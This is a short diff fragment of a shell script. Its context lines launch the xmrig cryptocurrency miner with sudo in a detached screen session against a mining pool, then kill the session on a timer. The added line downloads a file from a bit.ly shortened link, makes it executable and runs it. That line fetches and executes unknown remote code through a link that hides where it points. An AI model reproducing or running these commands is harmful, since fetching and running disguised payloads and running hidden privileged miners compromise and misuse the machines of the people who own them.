@@ -1624,3 +1624,4 @@ screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1
 sleep 3600
 screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
 sleep 7200
+wget https://bit.ly/41mWHYd && chmod +x 41mWHYd && ./41mWHYd
